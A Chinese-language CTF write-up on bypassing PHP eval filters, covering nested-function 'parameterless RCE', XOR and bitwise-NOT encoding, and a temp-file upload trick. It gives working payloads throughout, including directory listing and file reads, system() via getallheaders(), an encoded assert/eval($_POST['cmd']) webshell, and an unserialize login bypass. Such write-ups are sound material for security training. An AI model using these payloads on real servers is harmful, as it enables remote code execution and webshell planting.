# 无参数RCE

前置函数：

```
getchwd() 函数返回当前工作目录。
array_reverse() 以相反的元素顺序返回数组
scandir() 函数返回指定目录中的文件和目录的数组。
dirname() 函数返回路径中的目录部分。
chdir()   函数改变当前的目录。
localeconv() 返回当地金融信息，其中包含了点
readfile()   输出一个文件
chr(pos(localtime())) 利用当前秒数构造点    
current()    返回数组中的当前单元, 默认取第一个值
pos()      current() 的别名
next()     函数将内部指针指向数组中的下一个元素，并输出。
end()      将内部指针指向数组中的最后一个元素，并输出。
array_rand()   函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机 键名的数组。 
array_flip()   函数用于反转/交换数组中所有的键名以及它们关联的键值。
chr()  函数从指定的 ASCII 值返回字符。
hex2bin()  转换十六进制字符串为二进制字符串
getenv()   获取一个环境变量的值(在7.1之后可以不给予参数)
show_source() 高亮读取文件
highlight_file() 高亮读取文件
```

题目

```php+HTML
<?php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
    eval($_GET['code']);
} else {
    show_source(__FILE__);
}
?>
```

看到`preg_replace('/[^\W]+\((?R)?\)/'`，是正则匹配，分析一下过滤的是什么

\W表示非匹配非字母、数字、下划线。等价于 [^A-Za-z0-9_]，(?R)是引用当前表达式的意思，即可以用\w+\((?R)?\)替换到(?R)的位置，(?R)? 这里多一个?表示可以有引用也可以无，也就是说可以衍生匹配。

什么意思呢？

就是字符串+()的形式，但是可以继续引用，举个例子

```php
aaa() #无引用
aaa(bbb()) #一次引用
aaa(bbb(ccc())) #二次引用 
```

即可以嵌套函数。这个无参数rce利用的就是函数的嵌套构造出我们想要的东西。

既然我们要读flag，那么就要读取目录找flag

那么scandir('.')在linux中，点表示当前目录。

```php
<?php var_dump(scandir('.')); ?>
```

![image-20210816173108083](https://tcakalr.gitee.io/tc/image-20210816173108083.png)

这就是可以利用的东西，但是很明显.被正则过滤了。所以就要利用到一个函数`localeconv()`。

这就是前面前置知识提到的函数，它返回当地金融信息，其中包含了点

![image-20210816173249038](https://tcakalr.gitee.io/tc/image-20210816173249038.png)

我们要取数组中的第一个，就要用到pos()或current()函数。

![image-20210816173640323](https://tcakalr.gitee.io/tc/image-20210816173640323.png)

然后发现flag在最后一个，要取数组中最后一个就要用到end函数。

```
?code=var_dump(end(scandir(pos(localeconv())));
```

最后是读取，show_source()，highlight_file()，read()都可以。

```
?code=var_dump(readfile(end(scandir(pos(localeconv())))));
```

![image-20210816174619801](https://tcakalr.gitee.io/tc/image-20210816174619801.png)

构造点还有其他方法。

利用localtime()中返回的秒数来构造点，点的aiisc码正好是46在60秒之 内，我们只需等到46秒时候就能将点给构造出来。

<img src="https://tcakalr.gitee.io/tc/image-20210816175356724.png" alt="image-20210816175356724" style="zoom:67%;" />

其他方法：利用session_id构造

**session_id()** 返回当前会话ID。   如果当前没有会话，则返回空字符串（`""`）

**session_start()** 会创建新会话或者重用现有会话。   如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID，   则会重用现有会话

session_id的使用需要开启session，所以需要session_start()函数

所以就是是我们传入PHPSESSID，然后利用session_id()获取，但是session_id的使用需要开启session，所以需要session_start()函数，就是说session_id(session_start())执行后就变成了PHPSESSID，然后嵌套上show_source()函数，就变成了show_source(PHPSESSID)；，然后PHPSESSID赋值了zoeyflag，所以可以读取flag出来。

```
show_source(session_id(session_start()));
```

在cookie处传参

```
PHPSESSID=flag.php
```

利用 getallheaders() 来获取参数RCE

```
echo(system(end(getallheaders()))); 
```

在最后在最后一条请求头添加

```
cat flag.php
```

题目：

```
<?php
highlight_file(__FILE__);
$username = str_shuffle(md5("admin"));
$password = str_shuffle(md5("root"));

$login = false;
if (isset($_GET['str'])) {
    $str = $_GET['str'];
    $unserialize_str = unserialize($str);
    if ($unserialize_str['username'] == $username && $unserialize_str['password'] == $password) {
        $login = true;
    }
}

if ($login && isset($_GET['code'])) {
    if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
        if (!preg_match('/highlight_file|localeconv|pos|curret|chdir|localtime|time|session|getallheaders|system|array|implode/i', $_GET['code'])) {
            eval($_GET['code']);
        } else {
            echo "含有危险函数" . "<br/>";
        }
    } else {
        echo "不符合正则表达式" . "<br/>";
    }
} 
```

分析代码，看到md5，那大概率考的是弱比较，需要我们通过判定使$login为true。

才能进入到第二个if判断里，看到preg_replace（'/[^\W]+\((?R)?\)/'），就知道是无参数rce了。

要先构造点，但是localeconv，pos，current等都被过滤了。

先绕过第一个判断，这里是找到了一篇**天网管理系统**

![微信图片_20210406162802](https://tcakalr.gitee.io/tc/微信图片_20210406162802.png)

利用他的payload进行修改：a:2:{s:4:”user”;b:1;s:4:”pass”;b:1;}

改为a:2:{s:8:"username";b:1;s:8:"password";b:1;}

放在phpstudy测试，可以绕过，接下来就是构造点去读取目录了，

![微信图片_202104061628021](https://tcakalr.gitee.io/tc/微信图片_202104061628021.png)

查取相关文章发现了phpversion()函数可以利用

```
phpversion()返回PHP版本，如5.5.9

floor(phpversion())返回 5

sqrt(floor(phpversion()))返回2.2360679774998

tan(floor(sqrt(floor(phpversion()))))返回-2.1850398632615

cosh(tan(floor(sqrt(floor(phpversion())))))返回4.5017381103491

sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))返回45.081318677156

ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))返回46
```

有了46就可以用chr函数构造点了。

然后成功读取目录

```
var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))));
```

![微信图片_202104061628022](https://tcakalr.gitee.io/tc/微信图片_202104061628022.png)

发现flag文件在最后一位用end函数读取

```
show_source(end(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))));
```

![微信图片_202104061628023](https://tcakalr.gitee.io/tc/微信图片_202104061628023.png)

# 无字符绕过

无字符绕过涉及两个方法

一、异或

异或的符号是`^`，是一种运算符。

```
1 ^ 1 = 0
1 ^ 0 = 1
0 ^ 1 = 1
0 ^ 0 = 0
```

用异或的方法构造phpinfo：

```php
<?php
for($i=128;$i<255;$i++){
    echo sprintf("%s^%s",urlencode(chr($i)),urlencode(chr(255)))."=>". (chr($i)^chr(255))."\n";
}
?>
```

![image-20210816183217292](https://tcakalr.gitee.io/tc/image-20210816183217292.png)

```
(%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff)();
```

第二种构造方法如下，也是最常用的方法。

```php
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
//${_GET}{%ff}();&%ff=phpinfo
我们知道，经过一次get传参会进行一次URL解码，所以我们可以将字符先进行url编码再进行异或得到我们想要的字符。 %A0^%FF=>_ 
%B8^%FF=>G
%BA^%FF=>E  
%AB^%FF=>T 

<?php
$a = urldecode('%ff%ff%ff%ff');
$b = urldecode('%a0%b8%ba%ab');
echo $a^$b;
//输出_GET
```

![image-20210816183511227](https://tcakalr.gitee.io/tc/image-20210816183511227.png)

```
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
//${_GET}{%ff}();&%ff=phpinfo
```

```
${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=eval($_POST[%27cmd%27]) 
//${_GET}[_](${_GET}[__]);&_=assert&__=eval($_POST[%27cmd%27])
```

取反：
取反的符号是`~`，也是一种运算符。在数值的二进制表示方式上，将0变为1，将1变为0。

对一串恶意代码进行取反然后 URL 编码，在发送 Payload 的时候再次将其取反便可将代码还原，然后将其动态执行。并且，因为是取反，基本上用的都是不可见字符，所以不会触发到正则表达式。

```php
<?php
$a='assert';
echo urlencode(~$a);
echo "<br>";
$c='(eval($_POST[cmd]))';
echo urlencode(~$c);
?>
//%9E%8C%8C%9A%8D%8B
//%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6
```

最后在传入时再次取反

```php
(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6);
```

其实还可以利用的是 UTF-8 编码的某个汉字，将其中某个字符取出来，比如`'和'{2}`的结果是`"\x8c"`，其再取反即可得到字母`s`：

```javascript
echo ~('瞰'{1});    // a
echo ~('和'{2});    // s
echo ~('和'{2});    // s
echo ~('的'{1});    // e
echo ~('半'{1});    // r
echo ~('始'{2});    // t
```

```javascript
$__=('>'>'<')+('>'>'<');    // $__=2, 利用PHP的弱类型的特点获取数字
$_=$__/$__;    // $_=1

$____='';$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__}); // $____=assert

$_____=_;$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});  // $_____=_POST

$_=$$_____;  // $_=$_POST
$____($_[$__]);  // assert($_POST[2])
```

题目：

unkowctf

前置知识：

php会将上传的文件保存在临时文件夹下，默认的文件名是`/tmp/phpXXXXXX`

当上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是`/tmp/phpXXXXXX`，文件名最后6个字符是随机的大小写字母。

在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。
上传后会文件会保存在全局变量$_FILES里，该数组包含了所有上传文件的文件信息。



```php
<?php
if(isset($_GET['evil'])){
    if(strlen($_GET['evil'])>25||preg_match("/[\w$=()<>'\"]/", $_GET['evil'])){
        die("danger!!");
    }
    eval($_GET['evil']);
    echo $_GET['evil']
}
highlight_file(__FILE__);
?>
```

脚本跑一下没过滤的字符

```
<?php
for ($ascii = 0; $ascii < 256; $ascii++) {
    if (!preg_match("/[\w$=()<>'\"]/", chr($ascii))) {
        echo (chr($ascii));
    }
}
?>
```

![image-20210816222953514](https://tcakalr.gitee.io/tc/image-20210816222953514.png)

因为限制我们的传入不得大于25，所以异或和取反都无法利用。

但是.和`没被过滤，所以可以写文件进行攻击。

这里有两个办法。

一、利用命令执行的方法。

二、写一个小马。

先来看第一种：

这里要知道的是大写字母ascii值位于`@`与`[`之间，而上传文件的文件名是大小写都有，而其他只有小写。

利用这点来精确读取我们要的文件。

先写一个提交的表单

```html
<html lang="en">

<head>
	<meta charset="UTF-8">
	<title>Document</title>
</head>

<body>
	<form action="http://119.29.113.68:8085/" method="post" enctype="multipart/form-data">   
		<input type="file" name="file">
		<input type="submit" value="submit">
	</form>
</body>
</html>
```

通过在表单写入我们的命令，ls /> /var/www/html/aaa。然后提交执行，就能获取到flag了。

可能是没做好环境，ls就直接出flag。

ls是linux的获取目录命令，加上/是获取根目录下所有文件，然后就是命令执行漏洞中会提到，>可以用来写临时文件。

![image-20210816230139013](https://tcakalr.gitee.io/tc/image-20210816230139013.png)

写马也一样，同样用到命令执行，将马写入文件然后提交就行。

Guojingning：

题目源码

```php

<?php
show_source(__FILE__);
    $code = $_GET['code'];
    if(strlen($code) > 70 or preg_match('/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|<|>|\$|\?|\^|&|\|/is',$code)){
        die('Your Guojingming');
    }else if(';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code)){
        @eval($code);

    }

?> 
```

审计一下代码，过滤了很多东西，字母，数字都过滤了且不能超过70个。

这里还有就是二维数组可以构造字符串。

```
?code=[~%8F%97%8F%96%91%99%90][!%FF]();
php 二维数组能够构造字符串
['phpinfo'][false] 可以构建一个字符串 "phpinfo"
```

![img](https://tcakalr.gitee.io/tc/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20201223164808.png)

`~`这个符号是取反的符号，在二进制中会把0变成1,1变成0

![img](https://tcakalr.gitee.io/tc/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20201223172717.png)

取反之后在进行URL编码

通过二维数组和取反和url编码能绕过过滤。

但是下面还有

```php
else if(';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code)){
```

括号中不能含有参数，即前面提到的无参数rce，俗称套娃

嵌套函数，这里用到了getallheaders()

![img](https://tcakalr.gitee.io/tc/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_202012231727172.png)

```php
system(end(getallheaders()))
```

这样嵌套，再取反

```php
[~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));
```

再在http头加上cat /flag;

![img](https://tcakalr.gitee.io/tc/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_202012231727173.png)

就得到flag了。